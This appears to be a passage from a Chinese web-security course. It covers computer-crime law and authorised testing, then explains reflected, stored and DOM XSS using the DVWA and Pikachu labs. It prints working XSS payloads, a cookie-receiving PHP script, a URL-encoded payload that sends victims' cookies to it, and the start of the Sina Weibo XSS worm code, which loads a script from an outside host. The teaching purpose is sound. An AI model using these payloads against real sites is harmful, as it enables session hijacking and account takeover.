第二百八十五条　违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。
</p>

<p>
第二百八十六条　违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。
</p>

<p>
违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。
</p>

<p>
故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。
</p>
</blockquote>

<p>
最高人民法院最高人民检察院也对此作出了相关的解释，视具有以下情形之一的，
就会被认定为“情节严重”：
</p>

<blockquote>
<p>
（一）获取支付结算、证券交易、期货交易等网络金融服务的身份认证信息十组以上的；
</p>

<p>
（二）获取第（一）项以外的身份认证信息五百组以上的；
</p>

<p>
（三）非法控制计算机信息系统二十台以上的；
</p>

<p>
（四）违法所得五千元以上或者造成经济损失一万元以上的；
</p>

<p>
（五）其他情节严重的情形。
</p>
</blockquote>

<p>
看上面的量化数据，“情节严重”还是很容易达到的，尤其是 SQL 注入（在第
06、07 讲时会涉及），用 sqlmap 一测试，不小心就可能获取 500组身份认证
信息了。
</p>

<p>
这种在未授权的情况下进行的渗透测试很容易违反上述法律规定，那么我们如何
合法地进行渗透测试呢？这自然是要先拿到授权，而且必须是网站所有者的官方
书面授权，并盖有公章的。授权里要明确测试范围，比如域名，要注明测试时间
段，以及要把具体的渗透测试方案同步给客户，在客户同意后再进行测试。
</p>
</div>
</div>
<div id="outline-container-测试与入侵" class="outline-3">
<h3 id="测试与入侵">测试与入侵</h3>
<div class="outline-text-3" id="text-测试与入侵">
<p>
现在很多企业都有自己的SRC（安全响应中心）平台，都有公开的漏洞奖励计划，
允许大家对其产品进行安全测试。也有一些第三方众测平台，招集优秀的白帽子
进行安全测试，这种一般可以理解为授权，但也不是绝对的，主要还是得明确测
试与入侵的区别。
</p>

<p>
测试与入侵的区别可以参考以下几点：
</p>

<ol class="org-ol">
<li>是否窃取业务数据；</li>

<li>是否破坏业务的正常运营，特别是造没造成实际的经济损失；</li>

<li>是否恶意留取后门；</li>

<li>是否未经授权，对国家事务、国防建设、尖端科学技术领域的计算机信息系统进行测试。</li>
</ol>

<p>
不过，我想说的是，这里更关键的是看企业的态度，如果企业真的追究起来，一
般都是一告一个准，哪怕你第一时间报到SRC 或第三方平台上了，比如著名的
“袁炜事件”。
</p>
</div>
</div>
<div id="outline-container-袁炜事件" class="outline-3">
<h3 id="袁炜事件">“袁炜事件”</h3>
<div class="outline-text-3" id="text-袁炜事件">
<p>
2016年的“袁炜事件”就是一个醒目的案例，当事人袁炜发现了“世纪佳缘”网
站的漏洞，并将漏洞提交到第三方漏洞报告平台“乌云”上，“世纪佳缘”先是
确认并修复了漏洞，并对乌云和袁炜进行致谢。不过随后，“世纪佳缘”以“网
站数据被非法窃取”为由报警，警方经调查拘留了袁炜。
</p>

<p>
据袁炜父亲写的公开信所说，袁炜使用 sqlmap 利用 SQL注入漏洞获取了“世纪
佳缘”的网站数据 932条实名信息。而袁炜也正是因为这才被抓的。
</p>

<p>
一般情况下，企业安全人员与业务人员是两批人，如果业务人员直接借助法务起
诉白帽子，安全人员想拦也拦不住，白帽子基本是要遭罪的。虽然SRC和众测平
台有邀请测试的公开声明，但一旦涉及疑似入侵行为，仍可报警抓人。
</p>
</div>
</div>
<div id="outline-container-吴永丰事件" class="outline-3">
<h3 id="吴永丰事件">“吴永丰事件”</h3>
<div class="outline-text-3" id="text-吴永丰事件">
<p>
另外还有一起发生在我身边的案例。
</p>

<p>
今年 7月，杭州滨江人民法院公开了一份刑事判决书，原苏州紫豹科技有限公司
法定代表人吴永丰以盗窃罪被逮捕入狱，最终被判12 年。这是我微信好友里第
2 个入狱的，希望以后不会再有。
</p>


<figure id="org14569c4">
<img src="./images/Cip5yF_gTTKAeIr8AAZeupD-vY0247.png" alt="Cip5yF_gTTKAeIr8AAZeupD-vY0247.png" width="80%">

</figure>

<p>
事情经过，我直接引用公开的资料：
</p>

<blockquote>
<p>
当时，紫豹科技受江苏警方委托调查诈骗案，调查一个“万鸿彩店”App，该
App的后台叫“米来了”，由九辰公司管理。
</p>

<p>
吴永丰在 2019 年 4 月 20 日下午 15 时至 19时，利用调查时掌握的运维后台
服务器数据，注册了 30个虚假账户，运行自制转账程序，向九辰公司所管理的
第三方支付账户发起转账请求，转账共计88.47755 万元。
</p>

<p>
88 万元中 45 万元用于比特币交易，10 万元转至他人账户后无影无踪，剩余
33万被通过 ATM 取现、POS 机刷卡等方式提取，用于还款、发放工资、消费等
等。
</p>

<p>
2019 年 6 月 19日，作案两个月之后，吴永丰主动投案，在杭州市看守所中，
他度过了 25岁生日。整整一年之后，2020 年 6 月 19日，吴永丰在法庭上知道
了他接下来的命运，有期徒刑十二年。
</p>
</blockquote>

<p>
这是一起由授权的渗透测试转变为入侵犯罪的案例。原本协助警方破案是件好事，
但最终还是没能抵住金钱的诱惑，误入歧途，甚为可惜。
</p>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
我介绍了一些跟安全相关的法律法规，主要是想提醒你遵纪守法，不要从事黑产
犯罪，同时也要保护自己，不要随意测试他人的网站。
</p>

<p>
最佳方式的先 <b>拿到渗透测试授权书</b>
</p>
<ul class="org-ul">
<li>如果是对 SRC 的相关网站进行测试，记得点到为止，不要破坏，不要拿数据，不要留后门</li>
<li>如果是测试webshell，测试完及时删除并报告给厂商修复，真正地做到负责任的漏洞披露。</li>
<li>如果你是为了漏洞赏金，国外的漏洞报告平台更安全，奖金额度更高，或许是个更好的选择。</li>
</ul>

<p>
下一个模块，我们将正式进入漏洞攻防的案例，从案例中了解如何防御漏洞。
</p>


<figure id="org465b9cc">
<img src="./images/Cip5yF_gTR-AaFZGAAUXaN1tFUE104.png" alt="Cip5yF_gTR-AaFZGAAUXaN1tFUE104.png" width="80%">

</figure>


<p>
<a id="org9da8ba6"></a>
</p>
<blockquote>
<p>
<b>模块二，漏洞攻防原理</b>
</p>
</blockquote>
</div>
</div>
</section>
<section id="outline-container-h:74586b32-9e19-46c1-a958-153c6640a62e" class="outline-2">
<h2 id="h:74586b32-9e19-46c1-a958-153c6640a62e">XSS：劫持身份的“惯犯”</h2>
<div class="outline-text-2" id="text-h:74586b32-9e19-46c1-a958-153c6640a62e">
<p>
你好，我是赢少良。从本讲开始，我将带你进入 Web漏洞攻防的世界，学习一些
常见的 Web 漏洞的原理、利用与防御。
</p>

<p>
在这些常见的Web 漏洞中，XSS（Cross-site Script，跨站脚本）漏洞无疑是最
多见的。根据 HackerOne 漏洞奖励平台发布的/The 2020 Hacker Report/，XSS
漏洞类型占所有报告漏洞中的23％，排名第一。因此，在“ <b>模块二：漏洞攻防
案例</b> ”，我特意以 XSS作为讲解的第一个漏洞类型。
</p>


<figure id="orgca9d548">
<img src="./images/Cip5yF_cObWAcn2DAAEyh5k671U380.png" alt="Cip5yF_cObWAcn2DAAEyh5k671U380.png" width="80%">

</figure>

<p>
图 1：HackerOne 平台上报告的漏洞类型占比
</p>
</div>
<div id="outline-container-起源" class="outline-3">
<h3 id="起源">起源</h3>
<div class="outline-text-3" id="text-起源">
<p>
最早的 XSS 漏洞可追溯到 1999年末，微软安全工程师发现一些网站遭到攻击，
网站被插入了一些恶意脚本和图像标签。随后，微软对此类漏洞进行研究分析，
并在2000 年 1 月，正式使用“cross-site scripting”这个名称，然后逐渐被
业界采用，留传至今。
</p>

<p>
跨站脚本（Cross-site Script），按理应该简称为CSS，但为了与层叠样式表
（CSS）区分开，特意改为 XSS。
</p>

<p>
XSS漏洞，通常指的是 <b>网站对用户输入数据未做有效过滤，攻击者可以将恶意
脚本注入网站页面中，达到执行恶意代码的目的</b> 。攻击者只需要诱使受害者打
开特定的网址，就可以在受害者的浏览器中执行被注入的恶意代码，从而窃取用
户身份，执行一些敏感操作，或是进行其他的危害行为。
</p>
</div>
</div>
<div id="outline-container-危害绝不仅仅只是弹框" class="outline-3">
<h3 id="危害绝不仅仅只是弹框">危害：绝不仅仅只是弹框</h3>
<div class="outline-text-3" id="text-危害绝不仅仅只是弹框">
<p>
一些听过XSS的同学，可能仅停留在弹框的印象里；我曾在修复此类漏洞时，只
是简单地针对alert函数做了下过滤。这都是对 XSS攻防原理理解不够造成的误
解。其实，只要你想象力够丰富，它的危害是可以造成很大的。
</p>


<figure id="orgac1d061">
<img src="./images/Cip5yF_r7ISAKpGDAAE_SLFVjcU039.png" alt="Cip5yF_r7ISAKpGDAAE_SLFVjcU039.png" width="80%">

</figure>

<p>
图 2：常用于验证 XSS 漏洞的弹框
</p>

<p>
比如 2005 年 10 月 4 日诞生的世界上第一个 XSS蠕虫：Samy（作者的名字）。
</p>

<p>
Samy 利用网络社交媒体 MySpace 的 XSS 漏洞传播，受害者会自动将 Samy 本
人添加为关注者，并在受害者的用户页面显示一行字串“but most of all，
samy is my hero”，并再次插入恶意代码，谁访问受害者的网页谁就会被感染。
</p>

<p>
Samy 感染的用户呈指数倍增长，最终，超过 100万用户被感染，作者也因事态
发展失控而入狱，并被禁止 3年内接触计算机，外加 90 小时的社区服务。
</p>


<figure id="orga6d82b7">
<img src="./images/CgpVE1_r7JCAF0j6AAXp8LneUp8609.png" alt="CgpVE1_r7JCAF0j6AAXp8LneUp8609.png" width="80%">

</figure>

<p>
图 3：受 Samy 蠕虫攻击后，作者粉丝暴涨
</p>


<figure id="org90b0610">
<img src="./images/Cip5yF_r7JyAUiNUAAYMaTTY7f0311.png" alt="Cip5yF_r7JyAUiNUAAYMaTTY7f0311.png" width="80%">

</figure>

<p>
图 4：受 Samy 蠕虫攻击后，受害者的用户页面被篡改
</p>

<p>
Samy 蠕虫是现实世界中 XSS攻击的经典案例，除了蠕虫攻击外还有很多其他危
害：盗号、钓鱼欺诈、篡改页面、刷广告流量、内网扫描、网页挂马、挖矿、键
盘监听、窃取用户隐私等等。
</p>

<p>
如果能充分利用好业务场景下的功能，再结合一定技术和想象力，XSS所造成的
危害绝不仅仅只是弹框。如果你是开发，在修复 XSS漏洞过程中，也别单纯想着
怎么防止弹框。更为全面的防御方案，我会在下一讲《05｜XSS：漏洞的检测与
防御》中介绍。
</p>
</div>
</div>
<div id="outline-container-xss-漏洞的分类" class="outline-3">
<h3 id="xss-漏洞的分类">XSS 漏洞的分类</h3>
<div class="outline-text-3" id="text-xss-漏洞的分类">
<p>
通常 XSS 分为 <code>存储型</code> 和 <code>反射型</code> ，但还有一种比较特殊的 <code>DOM 型XSS</code>
，它本身属于反射型 XSS，不过介绍的时候需要单独来讲。因此，我就按 3种类
型划分：反射型、存储型、DOM 型。
</p>
</div>
<div id="outline-container-反射型-xss" class="outline-4">
<h4 id="反射型-xss">反射型 XSS</h4>
<div class="outline-text-4" id="text-反射型-xss">
<p>
我们首先来看反射型 XSS。反射型 XSS又被称为非持久型跨站脚本，它是将攻击
代码放在 URL参数中，而不是存储到服务器，因此需要诱使用户点击才能触发攻
击。
</p>

<p>
以 DVWA 中的反射型 XSS 题目为例，通过向 name参数输入以下代码即可触发漏
洞：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">&lt;script&gt;alert(1)&lt;/script&gt;
</pre>
</div>


<figure id="orge57605f">
<img src="./images/CgqCHl_r7LKANa2yAAEJmWv_d8A830.png" alt="CgqCHl_r7LKANa2yAAEJmWv_d8A830.png" width="80%">

</figure>

<p>
图5：利用 XSS 漏洞执行注入的JS代码
</p>

<p>
在 Chrome浏览器中，用“检查”功能看下网页源码，可以发现我们输入的代码
被解析并执行了：
</p>


<figure id="org86d1861">
<img src="./images/Ciqc1F_cOeGAdXqVAAAh9BFmkfc434.png" alt="Ciqc1F_cOeGAdXqVAAAh9BFmkfc434.png" width="80%">

</figure>

<p>
图6：被解析执行的注入的代码
</p>

<p>
其漏洞代码也非常简单。从 GET 参数 name获取用户输入后，未经过滤就直接调
用 echo 函数输出到页面，最终导致 XSS的产生。漏洞代码如下：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
// Is there any input?
if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';
}
?&gt;
</pre>
</div>

<p>
有人认为反射型 XSS 的危害不如存储型XSS，但我认为没有什么区别。这里的挑
战主要是URL是否包含攻击代码。
</p>
</div>
</div>
<div id="outline-container-存储型-xss" class="outline-4">
<h4 id="存储型-xss">存储型 XSS</h4>
<div class="outline-text-4" id="text-存储型-xss">
<p>
第二种 XSS 漏洞是存储型XSS，它又被称为持久型跨站脚本。攻击者将恶意代码
存储到服务器上，只要诱使受害者访问被插入恶意代码的页面即可触发。存储型
XSS 经常出现在一些可以发表评论的地方，如帖子、博客。
</p>

<p>
在 DVWA 靶场中就有一个存储型 XSS案例，它是个留言本的功能，支持用户发表
评论，然后将用户输入的数据直接存储到数据库，并输出到页面上。这个过程中
因为未做任何的过滤，导致了XSS 漏洞的产生。
</p>


<figure id="orgc12b439">
<img src="./images/Ciqc1F_r7NGAZEpfAAML5lu_1b0195.png" alt="Ciqc1F_r7NGAZEpfAAML5lu_1b0195.png" width="80%">

</figure>

<p>
图 7：DVWA 靶场中的存储型 XSS
</p>

<p>
<b>存储型 XSS的特点就是不需要在诱使用户访问的URL中包含攻击代码</b> ，因为它
已经存储到了服务器中，只需要让用户访问包含输出攻击代码的页面即可，漏洞
代码如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php
<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'btnSign'</span> ] ) ) {
    // Get input
    $<span style="color: #a0522d;">message</span> = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'mtxMessage'</span> ] );
    $<span style="color: #a0522d;">name</span>    = trim( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'txtName'</span> ] );
    // Sanitize message input
    $<span style="color: #a0522d;">message</span> = stripslashes( $<span style="color: #a0522d;">message</span> );
    $<span style="color: #a0522d;">message</span> = mysql_real_escape_string( $<span style="color: #a0522d;">message</span> );
    // Sanitize name input
    $<span style="color: #a0522d;">name</span> = mysql_real_escape_string( $<span style="color: #a0522d;">name</span> );
    // Update database
    $<span style="color: #a0522d;">query</span>  = <span style="color: #8b2252;">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;
    $<span style="color: #a0522d;">result</span> = mysql_query( $<span style="color: #a0522d;">query</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . mysql_error() <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );
    //mysql_close();
}
?&gt;
</pre>
</div>

<p>
从 POST 参数中获取 mtxMessage 和 txtName参数后，虽然经过一定过滤才插入
到数据库中，但是中括号不会被过滤，在其他地方将其输出到页面后就会被解析
（如图5）。我们在 Message 中输入“ <code>&lt;script&gt;=alert(1)=&lt;/script&gt;</code> ”，点
击“Sign Guestbook”提交，即可触发漏洞。
</p>


<figure id="orgf9e28f9">
<img src="./images/Ciqc1F_r7U6AD8GlAADstIgZx_U342.png" alt="Ciqc1F_r7U6AD8GlAADstIgZx_U342.png" width="80%">

</figure>

<p>
图 8：触发漏洞弹框
</p>

<p>
利用 Chrome浏览器的“检查”功能查看网页源码，可以发现刚才输入消息中的
<code>&lt;script&gt;</code> 标签被解析了：
</p>


<figure id="orgaec7643">
<img src="./images/Cip5yF_cOlSAfG1CAAAitat9u8o887.png" alt="Cip5yF_cOlSAfG1CAAAitat9u8o887.png" width="80%">

</figure>

<p>
图 9：script 标签被解析
</p>

<p>
正是它导致弹框的出现。
</p>
</div>
</div>
<div id="outline-container-dom-型-xss" class="outline-4">
<h4 id="dom-型-xss">DOM 型 XSS</h4>
<div class="outline-text-4" id="text-dom-型-xss">
<p>
最后是 DOM 型 XSS 漏洞，它是基于文档对象模型（Document Object Model，
DOM，用于将 Web页面与脚本语言链接起来的标准编程接口）的一种漏洞，它不
经过服务端，而是通过URL 传入参数去触发，因此也属于反射型 XSS。
</p>

<p>
由于客户端的 JavaScript 可以访问浏览器页面中的 DOM 对象，因此它能够决定
如何处理当前页面的 URL，比如获取 URL中的相关数据进行处理，然后动态更新
到页面上。这导致 DOM 型 XSS的漏洞代码常位于网页的 JavaScript 代码中。
</p>

<p>
以 Pikachu 漏洞练习平台中的“DOM 型XSS”题目为例：它只有一个文本输入框，
外加一个“click me!”的按钮。我们先看下网页源码，看点击按钮后的回调函
数。
</p>


<figure id="orgb01d817">
<img src="./images/CgpVE1_cOmCAFLL8AAESjwfi8EI088.png" alt="CgpVE1_cOmCAFLL8AAESjwfi8EI088.png" width="80%">

</figure>

<p>
图 10：定位按钮的回调函数
</p>

<p>
可以看到，点击后会执行一个叫 domxss 的函数。在源码内搜索下该函数。
</p>


<figure id="org27d5ec3">
<img src="./images/CgpVE1_r7WiAQMawAAJJrNlYAtg875.png" alt="CgpVE1_r7WiAQMawAAJJrNlYAtg875.png" width="80%">

</figure>

<p>
图 11：domxss 函数
</p>

<p>
domxss 函数就 2 行代码，第一行代码先通过
document.getElementById("text").value 获取 ID为“text”的元素内容。其
实这就是输入框的内容，输入框的 ID就叫“text”。
</p>


<figure id="org424155f">
<img src="./images/CgpVE1_r7XKAWt3vAAFpOE6XpHM284.png" alt="CgpVE1_r7XKAWt3vAAFpOE6XpHM284.png" width="80%">

</figure>

<p>
图12：id 为 text 的输入框
</p>

<p>
第二行代码是将获取的输入框内容传递给 ID 为“dom”的元素，并将其写入
innerHTML，也就是输出到 HTML页面中，整个过程对用户输入数据都未做任何过
滤。直接输入 test 看下：
</p>


<figure id="orge9b2e2d">
<img src="./images/CgqCHl_cOnqAWzPrAACfVXHEAAk486.png" alt="CgqCHl_cOnqAWzPrAACfVXHEAAk486.png" width="80%">

</figure>

<p>
图13：用户数据的输出位置
</p>

<p>
可以看到，输入框的内容输出到了 dom 元素中，作为 a标签的链接地址。我们
直接利用 JavaScript 伪协议来构造链接触发 JS代码的执行，输入以下代码，
然后点击“what do you see?”链接后即可触发漏洞：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">javascript:alert(1)
</pre>
</div>


<figure id="org58c8d0c">
<img src="./images/CgqCHl_cOoiAD43UAADLY39KIOc450.png" alt="CgqCHl_cOoiAD43UAADLY39KIOc450.png" width="80%">

</figure>

<p>
图 14：利用 javascript 伪协议触发漏洞
</p>

<p>
导致 DOM 型 XSS 的相关 DOM 操作函数有很多，这里我只是举了比较常见的
innerHTML 属性设置导致的漏洞为例子，其他的还有像 eval、document.write
等可触发漏洞的数据输出位置。
</p>

<p>
网上曾有人整理了一份关于 DOM XSS的数据污染源（Source，即用户输入数据）
和漏洞触发点（Sink）的列表（虽然不够全面，但可以作为参考），如下图所示：
</p>


<figure id="org1ccc1e9">
<img src="./images/Cip5yF_cOp-Acv-zAANwGCdez2k054.png" alt="Cip5yF_cOp-Acv-zAANwGCdez2k054.png" width="80%">

</figure>

<p>
图 15：DOM XSS Sources &amp; Sinks
</p>

<p>
若数据从 Source 传到 Sink 过程中，未做任何过滤，就有可能存在 DOM XSS。
这个思路也常作为动静态检测 DOM XSS的重要思路，具体会在下一讲中介绍。
</p>
</div>
</div>
</div>
<div id="outline-container-攻击-xss-漏洞" class="outline-3">
<h3 id="攻击-xss-漏洞">攻击 XSS 漏洞</h3>
<div class="outline-text-3" id="text-攻击-xss-漏洞">
<p>
这里开始我想给你介绍一些关于 XSS 漏洞利用的方法，避免你停留在 XSS只能
弹框的思想层面。
</p>

<p>
针对 <code>XSS 漏洞最为常见的两种攻击方式就是窃取 Cookie劫持他人的会话，以
及前面介绍过的蠕虫攻击</code> 。因此，这里会重点介绍这两者的相关技术，同时也
涉及一些其他的攻击思路，最后会引出一些自动化利用工具的使用。
</p>
</div>
<div id="outline-container-窃取-cookie" class="outline-4">
<h4 id="窃取-cookie">窃取 Cookie</h4>
<div class="outline-text-4" id="text-窃取-cookie">
<p>
我们首先来看“窃取 Cookie”。
</p>

<p>
Cookie 是由服务器提供的存储在客户端的数据，允许 JavaScript访问，常用于
识别用户身份和保存会话等功能。如果 Web 应用程序存在 XSS漏洞，那么攻击
者通过注入恶意 JavaScript 脚本就可以窃取到Cookie，进而以用户身份执行恶
意操作。
</p>

<p>
通过 document.cookie 就可以访问到 Cookie。以百度网站为例，在检查工具中
的Console 标签页输入 document.cookie 就可以看到当前百度域名下的 Cookie
值。
</p>


<figure id="orgb1b44d9">
<img src="./images/Cip5yF_cOpiAMrRcAACz4ZPfiHE961.png" alt="Cip5yF_cOpiAMrRcAACz4ZPfiHE961.png" width="80%">

</figure>

<p>
图 16：百度 Cookie
</p>

<p>
当一个网站存在 XSS 时，我们就可以通过执行 document.cookie获取当前受害
者的 cookie，前提是要先诱使受害者访问特定的 URL。
</p>

<p>
以 Pikachu 中的反射型 XSS(Get) 题目为例，其触发链接为：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(1)&lt;/script&gt;&amp;submit=submit
</pre>
</div>

<p>
访问后的效果：
</p>


<figure id="orge3cef9a">
<img src="./images/Cip5yF_cOraARaEHAACAgMxORjM038.png" alt="Cip5yF_cOraARaEHAACAgMxORjM038.png" width="80%">

</figure>

<p>
图 17：Pikachu 中的反射型 XSS(Get) 利用
</p>

<p>
我们试试看能否读取 cookie：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/vul/xss/xss_reflected_get.php?message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;submit=submit
</pre>
</div>

<p>
可以访问到 cookie：
</p>


<figure id="org3e82052">
<img src="./images/CgpVE1_r7PeAeYKNAAKRGDzBTuE416.png" alt="CgpVE1_r7PeAeYKNAAKRGDzBTuE416.png" width="80%">

</figure>

<p>
图 18：成功通过 JS 读取 Cookie
</p>

<p>
接下来，我们就可以在自己控制的服务器写个接收 cookie 的接口，比如
cookie.php。刚好 Pikachu靶场自带这样的功能，我以它为例，并加了关键代码
的注释：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    include_once '../inc/config.inc.php';
    include_once '../inc/mysql.inc.php';
    $link=connect();  // 连接数据库

    //这个是获取 cookie 的 api 页面
    if(isset($_GET['cookie'])){  // 通过 GET 参数 cookie 来接收数据
        $time=date('Y-m-d g:i:s');
        $ipaddress=getenv ('REMOTE_ADDR');
        $cookie=$_GET['cookie'];
        $referer=$_SERVER['HTTP_REFERER'];
        $useragent=$_SERVER['HTTP_USER_AGENT'];
        $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
        values('$time','$ipaddress','$cookie','$referer','$useragent')";
        $result=mysqli_query($link, $query); // 将窃取的数据存入数据库
    }
    header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站，主要起到隐藏作用，避免被发现

    ?&gt;
</pre>
</div>

<p>
这个 cookie.php 通过 GET 参数 cookie 来接收数据，那我们向它传递
document.cookie 的值就可以窃取想要的 cookie 了。基于此，我们重新构造
URL。
</p>

<p>
<b>注意要做 URL 编码，否则“+”连接符会被吃掉，导致无法窃取 cookie</b> 。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2Flocalhost%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit
</pre>
</div>

<p>
我们打开 <a href="http://localhost/pkxss/pkxss_login.php">http://localhost/pkxss/pkxss_login.php</a> 上 XSS后台（第一次使用
时按提示点安装，然后用默认帐密登录：admin/123456），可以看到已经成功窃
取到Cookie：
</p>


<figure id="orgf6bb77f">
<img src="./images/CgqCHl_kTAmAQB_aAAEDK3yLJkY943.png" alt="CgqCHl_kTAmAQB_aAAEDK3yLJkY943.png" width="80%">

</figure>

<p>
图 19：窃取到 Cookie
</p>

<p>
网上也有很多开源的 XSS 平台用来接收 Cookie，你在GitHub搜索就可以找到很
多，大多数可以直接通过 Docker 快速安装。
</p>


<figure id="orgfce2d04">
<img src="./images/Ciqc1F_cOtaASyQeAAHRnEyplEU737.png" alt="Ciqc1F_cOtaASyQeAAHRnEyplEU737.png" width="80%">

</figure>

<p>
图 20：各种开源的 XSS 利用平台
</p>

<p>
获取 Cookie 后，我们就可以本地修改 Cookie来登录受害者的账号（除非刚好
窃取的 Cookie不包含用户登录信息，比如未登录状态下访问的攻击链接），可
以使用 Chrome插件 EditThisCookie 来设置窃取的 Cookie：
</p>


<figure id="org14b6a64">
<img src="./images/CgpVE1_r7hmATCQBAAHhyKThdOI750.png" alt="CgpVE1_r7hmATCQBAAHhyKThdOI750.png" width="80%">

</figure>

<p>
图 21：EditThisCookie
</p>

<p>
还有另一款早期业界比较常用的工具，叫“桂林老兵 Cookie欺骗工具”，以及
在《01 | 武器库：常用的渗透测试工具》中介绍的 Burp Suite，它们均支持修
改 Cookie。
</p>
</div>
</div>
<div id="outline-container-蠕虫攻击" class="outline-4">
<h4 id="蠕虫攻击">蠕虫攻击</h4>
<div class="outline-text-4" id="text-蠕虫攻击">
<p>
前面我介绍了 Samy 蠕虫，但并没有谈到XSS 蠕虫的实现技术。XSS蠕虫的实现
正是得益于Ajax 技术的出现，而后者正是 Web2.0 的标志性技术。
</p>

<p>
Ajax（Asynchronous JavaScript and XML，异步 JavaScript 和XML）是指一种
<b>创建交互式网页应用的网页开发技术</b> 。这个概念比较抽象，具体讲就是在我
们浏览网页，做一些操作时，可以减少浏览器的一些页面重绘操作，避免出现页
面抖动、闪现之类的不适体验。这也正是Web2.0 带来的改变。
</p>

<p>
Ajax 中的核心技术就是 XMLHttpRequest，它允许 JavaScript脚本与服务器进
行通信，在不刷新页面的情况下，向服务器发送请求或是接收服务器的响应数据。
</p>

<p>
下面我以之前影响比较大的新浪微博 XSS 蠕虫攻击事件为例，介绍 Ajax 技术
在XSS 蠕虫中的应用，从攻击代码来详细讲解。
</p>


<figure id="org641f0e2">
<img src="./images/Ciqc1F_cOu-AUgG8AAMoVNqvtj8470.png" alt="Ciqc1F_cOu-AUgG8AAMoVNqvtj8470.png" width="80%">

</figure>

<p>
图 22 ：新浪微博上感染 XSS 蠕虫的用户
</p>

<p>
2011年 6 月 28 日，新浪微博遭受 XSS蠕虫的攻击，很多受害者被迫发布带有
攻击链接的私信和微博。这些消息都带有一定的诱惑性，其他用户点击后也会此
影响。受害者在感染后，都会自动关注一位名为“hellosamy”的微博用户（估
计是效仿Samy蠕虫），然后向关注受害者的用户发送含有同样链接地址的私信，
并发布含攻击链接的微博。得益于这种传播方式，在16分钟内病毒就感染了
33000 个用户。
</p>

<p>
我们来分析下新浪微博的 XSS 蠕虫代码：
</p>
<div class="org-src-container">
<pre class="src src-sh">// &#21019;&#24314; XMLHttp &#23545;&#35937;&#29992;&#20110;&#25910;&#21457;&#35831;&#27714;
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">createXHR</span>(){ 
    <span style="color: #a020f0;">return</span> window.XMLHttpRequest?
    new XMLHttpRequest():
    new ActiveXObject(<span style="color: #8b2252;">"Microsoft.XMLHTTP"</span>);
}
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">getappkey</span>(url){
    xmlHttp = createXHR();
    xmlHttp.open(<span style="color: #8b2252;">"GET"</span>,url,false); //&#33719;&#21462; AppKey &#19981;&#37319;&#29992;&#24322;&#27493;&#25191;&#34892;,&#31561;&#24453;&#35831;&#27714;&#36820;&#22238; 
    xmlHttp.send();
    result = xmlHttp.responseText;
    id_arr = <span style="color: #8b2252;">''</span>;
    // &#27491;&#21017;&#21305;&#37197;&#20986; AppKey &#25968;&#32452;,&#21253;&#21547;&#27599;&#20010;&#34987;&#25910;&#21548;&#29992;&#25143;&#30340; uid 
    id = result.match(/namecard=<span style="color: #8b2252;">\"</span>true<span style="color: #8b2252;">\"</span> <span style="color: #a0522d;">title</span>=<span style="color: #8b2252;">\"</span>[^<span style="color: #8b2252;">\"</span>]*/g);
         https://beefproject.com/
    <span style="color: #a020f0;">for</span>(<span style="color: #a0522d;">i</span>=0;i&lt;id.length;i++){
        sum = id[i].toString().split(<span style="color: #8b2252;">'"'</span>)[3];  //&#37325;&#26032;&#25552;&#21462;&#25972;&#29702;
        id_arr += sum + <span style="color: #8b2252;">'||'</span>;
    }
    <span style="color: #a020f0;">return</span> id_arr;
}
<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">random_msg</span>(){

    // &#20351;&#29992;&#30701;&#22320;&#22336;&#26381;&#21153;&#65292;&#26500;&#36896; XSS &#20256;&#25773;&#36830;&#25509;&#65292;&#38544;&#34255;&#33258;&#24049;&#30340;&#24694;&#24847; js &#33050;&#26412;&#65292;
    // &#36825;&#37324;&#27491;&#26159; XSS &#28431;&#27934;&#30340;&#35302;&#21457;&#20301;&#32622;
 //http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%<span style="color: #a0522d;">20src</span>=//www.2kt.cn/images/t.js%3E%3C/script%3E?<span style="color: #a0522d;">type</span>=upd
    link = <span style="color: #8b2252;">' http://163.fm/PxZHoxn?id='</span> + new Date().getTime();;
    // &#35805;&#39064;&#21015;&#34920; 
    var msgs = [
        <span style="color: #8b2252;">'&#37101;&#32654;&#32654;&#20107;&#20214;&#30340;&#19968;&#20123;&#26410;&#27880;&#24847;&#21040;&#30340;&#32454;&#33410;&#65306;'</span>,
